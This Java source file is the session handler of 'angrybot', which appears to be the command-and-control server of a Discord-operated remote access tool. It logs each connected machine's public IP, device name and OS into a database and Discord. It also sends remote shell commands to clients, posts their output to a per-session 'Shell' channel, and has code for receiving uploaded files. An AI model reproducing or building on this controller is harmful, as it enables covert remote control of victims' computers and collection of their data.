package de.stynxyxy.angrybot.networking;
import de.stynxyxy.angrybot.util.IPUtil;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.IPermissionHolder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import org.jetbrains.annotations.NotNull;

import javax.naming.Context;
import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.nio.charset.StandardCharsets;
import java.sql.Date;
import java.sql.SQLException;
import java.time.LocalDateTime;
import java.util.Arrays;
import java.util.EnumSet;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class Session implements Runnable {


    private final Socket clientSocket;
    private final int id;
    public String IPAdress;
    public String DeviceName;
    public String OperatingSystem;
    public String OperatingSystemVersion;
    public Server server;
    private final UUID userid;



    public Session(Server server, Socket clientSocket, int id) {
        this.clientSocket = clientSocket;
        this.id = id;
        this.server = server;
        this.IPAdress = "";
        this.DeviceName = "";
        this.OperatingSystem = "";
        this.OperatingSystemVersion = "";
        this.userid = UUID.randomUUID();
    }

    @Override
    public void run() {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
             PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {

            String inputLine;
            this.sendCommand("TestCommand");
            while ((inputLine = reader.readLine()) != null) {
                //System.out.println("Received: " + inputLine);
                if (inputLine.startsWith("FILE")) {

                    if (inputLine.contains("FILE INFO NAME")) {
                        System.out.println("FILE INFO NAME "+inputLine.replace("FILE INFO NAME",""));

                    }
                    if (inputLine.contains("FILE INFO SIZE")) {
                        System.out.println("FILE INFO SIZE "+inputLine.replace("FILE INFO SIZE",""));

                    }

                    //receiveFile(clientSocket.getInputStream());
                    out.println("FILE_RECEIVED");
                    System.out.println("got "+inputLine);
                } else if (inputLine.startsWith("INFO")) {
                    //if (inputLine.contains("Heartbeat Message")) continue;

                    if (inputLine.contains("IPADRESS")) {
                        String l = inputLine.replaceAll("INFO IPADRESS","");
                        this.IPAdress = l;
                    } else if (inputLine.contains("DEVICENAME")) {
                        String deviceName = inputLine.replaceAll("INFO DEVICENAME","");
                        this.DeviceName = deviceName;
                    } else if (inputLine.contains("OS_NAME")) {
                        String os = inputLine.replaceAll("INFO OS_NAME","");
                        this.OperatingSystem = os;
                    } else if (inputLine.contains("OS_VERSION")) {
                        String version = inputLine.replaceAll("INFO OS_VERSION","");
                        this.OperatingSystemVersion = version;
                    }else if (inputLine.contains("CMD_OUTPUT")) {
                        System.out.println("Raw before: "+inputLine);
                        String Raw = inputLine.replace("CMD_OUTPUT ","");
                        Raw = Raw.replace("INFO","");
                        System.out.println("got An response with Id: "+inputLine);
                        System.out.println("Raw: "+Raw);
                        String[] ar = Raw.split(" ");
                        int id = Integer.parseInt(ar[1]);
                        Raw = Raw.replace(Integer.toString(id),"");
                        System.out.println("Got Answer to Command with id "+id);
                        if (server.CurrentRespondingCommandChannels.get(id).getType().isMessage()) {
                            TextChannel channel = (TextChannel) server.CurrentRespondingCommandChannels.get(id);
                            server.CurrentRespondingCommandChannels.remove(id);
                            if (!Raw.isEmpty() && Raw != null) {
                                try {
                                    channel.sendMessage(Raw).queue();
                                } catch (IllegalStateException e) {
                                    channel.sendMessage("There is no response: "+Raw).queue();
                                }
                                channel.sendMessage(Raw).queue();
                                System.out.println("got Response"+Raw);
                            } else {
                                channel.sendMessage("There is no response to this COmmand").queue();
                            }

                        }

                    } else if (inputLine.contains(""))
                    System.out.println("Recieved Information: " + inputLine.substring(5));
                    this.sendServerResponse(out,"RECIEVED INFO");
                } else {
                    System.out.println("unknown identifier: " + inputLine);
                    out.println("UNKNOWN_COMMAND");

                }
            }
        } catch (SocketException e) {
            this.disconnect(Context.DNS_URL);
        } catch (IOException e)  {
            e.printStackTrace();
        } finally {
            close();
        }
    }
    public void sendServerResponse(@NotNull PrintWriter socketWriter, String... command) {
        Arrays.stream(command).forEach(socketWriter::println);
    }
    public void sendCommand(@NotNull String command) {
        try {
            command = "SERVERCOMMAND "+command;
            byte[] commandBytes = command.getBytes();

            String encoded = new String(commandBytes, StandardCharsets.US_ASCII);

            this.clientSocket.getOutputStream().write(encoded.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) { e.printStackTrace();}

    }
    public int sendCommandwithId(@NotNull String command) {
        Random random = new Random();
        try {
            int id = random.nextInt(0,1000000);
            command = "SERVERCOMMAND "+id+" "+command;
            byte[] commandBytes = command.getBytes();
            String encoded = new String(commandBytes,StandardCharsets.UTF_8);

            this.clientSocket.getOutputStream().write(encoded.getBytes(StandardCharsets.UTF_8));
            return id;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return -1;
    }
    private void disconnect(String context) {
        try {
            this.clientSocket.close();
            this.server.removeSessionById(this.id);
            this.server.getBot().getJda().getGuilds().forEach(this.server::deleteSessionsInServer);
            System.out.println("Reset Channels!");

            System.out.println("Removed Session!"+this.id);
            System.out.printf("Size of Sessions: %s",this.server.getSessions().size());
            for (Session session: this.server.getSessions()) {
                this.server.getBot().getJda().getGuilds().forEach(this::CreateSessionInServer);
            }
        }catch (IOException e) {

        }

    }
    public void CreateSessionInServer(Guild server) {

        Thread thread = new Thread(() -> {
            try {
                String CategoryName = "Session: "+this.id;
                server.createCategory(CategoryName).queue();

                TimeUnit.SECONDS.sleep(1);

                for (Category category: server.getCategories()) {
                    //System.out.println("Test: CategoryName: "+category.getName()+" FName: "+CategoryName+" Bool: "+category.getName().equalsIgnoreCase(CategoryName));
                    if (category.getName().equalsIgnoreCase(CategoryName)) {
                        if (category.getChannels().size() == 0) {
                            category.createTextChannel("Information").queue();
                            category.createTextChannel("Debug").queue();
                            category.createTextChannel("Shell").queue();
                            category.createVoiceChannel("Live").queue();
                            TimeUnit.SECONDS.sleep(1);
                            for (TextChannel channel :  category.getTextChannels()) {

                                System.out.println("Channel: "+channel.getName());
                                if (channel.getName().equalsIgnoreCase("information")) {
                                    channel.sendMessage("New Client: "+this.clientSocket.getInetAddress()).queue();
                                    this.ForwardSystemInformation(channel);
                                }  else if (channel.getName().equalsIgnoreCase("debug")) {
                                    System.out.println("Found Debug Channel");
                                    channel.getManager().setTopic("Debugging").queue();
                                    //Role debugRole = server.getRolesByName("DebugRole", true).stream().findFirst().orElse(null);
                                    Role debugRole = server.getRolesByName("DebugRole", true).get(0);
                                    if (debugRole != null) {
                                        IPermissionHolder p = debugRole;
                                        EnumSet<Permission> allowedPermissions = EnumSet.of(Permission.VIEW_CHANNEL);
                                        EnumSet<Permission> deniedPermissions = EnumSet.of(Permission.VIEW_CHANNEL);
                                        channel.getManager().putPermissionOverride(debugRole,allowedPermissions,null).queue();
                                        for (Member member: server.getMembers()) {
                                            if (!member.getRoles().contains(debugRole)) {
                                                IPermissionHolder permissionHolder = member;

                                                EnumSet<Permission> deniedPermissions2 = EnumSet.of(Permission.VIEW_CHANNEL);
                                                channel.getManager().putPermissionOverride(debugRole,null,deniedPermissions2).queue();
                                            }
                                        }
                                    }

                                }


                            }

                        }



                    }
                }
            } catch (InterruptedException e) {

            }

        });
        thread.run();
    }
    public UUID getUserid() {
        return userid;
    }

    public void ForwardSystemInformation(TextChannel channel) {
        Thread InformationRecThread = new Thread(() -> {
            boolean recvd = false;
            while (recvd == false) {
                if (!this.IPAdress.isEmpty() && !this.DeviceName.isEmpty() && !this.OperatingSystem.isEmpty() && !this.OperatingSystemVersion.isEmpty()) {
                    SendInformationsInChannel(channel);

                    try {
                        this.server.getConnection().addConnectionToDb(this.DeviceName,this.userid,this.IPAdress,new Date(System.currentTimeMillis()));
                    } catch (SQLException e) {
                        e.printStackTrace();
                    }

                    recvd = true;
                }
                /*
                System.out.println("IPADRESS empty: "+this.IPAdress.isEmpty()+"v: "+this.IPAdress);
                System.out.println("DEVICENAME empty: "+this.DeviceName.isEmpty()+"v: "+this.DeviceName);
                System.out.println("OS Version empty: "+this.OperatingSystemVersion.isEmpty()+"v: "+this.OperatingSystemVersion);
                System.out.println("OS Name empty: "+this.OperatingSystem.isEmpty()+"v: "+this.OperatingSystem);
                 */
                try {
                    TimeUnit.MILLISECONDS.sleep(10l);
                } catch (InterruptedException e) {}

            }
        });
        InformationRecThread.start();

    }

    public void SendInformationsInChannel(TextChannel channel) {
        EmbedBuilder embedBuilder = new EmbedBuilder();
        embedBuilder.setTitle("Information about Session: "+this.id);
        String networkLine = "Session ID: "+this.id+"\n";
        String DeviceNameLine = "Device Name: "+this.DeviceName +"\n";
        String OperatingSystemLine = "Operating System: "+this.OperatingSystem+"\n";
        String OperatingSystemVersionLine = "Operating System Version: "+this.OperatingSystemVersion+"\n";
        String PublicIPLine = "Public IP: "+ this.IPAdress +"\n";
        String LocalIPLine = "Local IP: "+IPUtil.getBlankIpByInet(this.getClientSocket().getLocalAddress())+"\n";

        String Information = networkLine + DeviceNameLine + OperatingSystemLine + OperatingSystemVersionLine + PublicIPLine + LocalIPLine;
        embedBuilder.addField("network", Information,true);
        channel.sendMessageEmbeds(embedBuilder.build()).queue();
    }

    private void receiveFile(InputStream in) throws IOException {

        DataInputStream dataInputStream = new DataInputStream(in);


        String fileName = dataInputStream.readUTF();
        long fileSize = dataInputStream.readLong();

        System.out.println("Empfange Datei: " + fileName + " mit Größe: " + fileSize + " Bytes");

        // Datei empfangen
        try (FileOutputStream fos = new FileOutputStream("received_" + fileName)) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            long totalBytesRead = 0;

            // Byte-Blöcke lesen und in die Datei schreiben, bis die gesamte Datei empfangen ist
            while (totalBytesRead < fileSize && (bytesRead = dataInputStream.read(buffer, 0, (int) Math.min(buffer.length, fileSize - totalBytesRead))) != -1) {
                fos.write(buffer, 0, bytesRead);
                totalBytesRead += bytesRead;
            }
        }

        System.out.println("Datei erfolgreich empfangen: " + fileName);
    }

    public void close() {
        try {
            if (clientSocket != null && !clientSocket.isClosed()) {
                clientSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public Socket getClientSocket() {
        return clientSocket;
    }


}
